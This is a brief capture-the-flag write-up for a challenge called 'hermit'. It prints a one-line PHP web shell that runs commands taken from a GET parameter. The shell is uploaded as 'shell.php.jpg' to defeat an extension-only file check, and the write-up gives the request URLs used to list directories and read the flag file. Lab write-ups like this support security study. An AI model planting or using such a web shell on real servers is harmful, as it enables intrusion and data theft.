<center><a target="_blank" href="https://codelearn.me/assets/img/hermit-logo.png"><img alt="hermit logo" src="https://codelearn.me/assets/img/hermit-logo.png" width="300px"/></a></center>
<h2 id="solution">Solution</h2>
<p>There is only one form that accepts a file.</p>
<p>The validation of the file is based on extension so we can try and upload <code>shell.php.jpg</code> image with content like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span><span style="color:#e6db74">`$_GET[0]`</span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><br/>
<p>When image is uploaded we see the page like this:</p>
<p><a target="_blank" href="https://codelearn.me/assets/img/hermit-shell-uploaded.png"><img alt="hermit logo" src="https://codelearn.me/assets/img/hermit-shell-uploaded.png" width="500px"/></a></p>
<p>Click on <strong>See image</strong> and we see a blank page with some strange PHP errors. It&rsquo;s because our &ldquo;image&rdquo; expects get param called &ldquo;0&rdquo; so let&rsquo;s add one.</p>
<p><code>104.197.195.221:8086/show.php?filename=VbvJC0&amp;0=ls</code></p>
<p>and we can see list of directories in the project root.</p>
<p><a target="_blank" href="https://codelearn.me/assets/img/hermit-ls-project-root.png"><img alt="hermit logo" src="https://codelearn.me/assets/img/hermit-ls-project-root.png" width="500px"/></a></p>
<p>Now it&rsquo;s time to search for flag. Let&rsquo;s check home directory like this:</p>
<p><code>104.197.195.221:8086/show.php?filename=VbvJC0&amp;0=ls /home</code></p>
<p>we see there is only one folder <code>hermit</code></p>
<p>Let&rsquo;s check that folder:</p>
<p><code>104.197.195.221:8086/show.php?filename=VbvJC0&amp;0=ls /home/hermit</code> - and there is flag folder now.</p>
<p><code>104.197.195.221:8086/show.php?filename=VbvJC0&amp;0=ls /home/hermit/flag</code> - shows us <code>userflag.txt</code></p>
<p><code>104.197.195.221:8086/show.php?filename=VbvJC0&amp;0=cat /home/hermit/flag/userflag.txt</code> - shows us the flag</p>
<p><a target="_blank" href="https://codelearn.me/assets/img/hermit1-flag.png"><img alt="hermit logo" src="https://codelearn.me/assets/img/hermit1-flag.png" width="500px"/></a></p>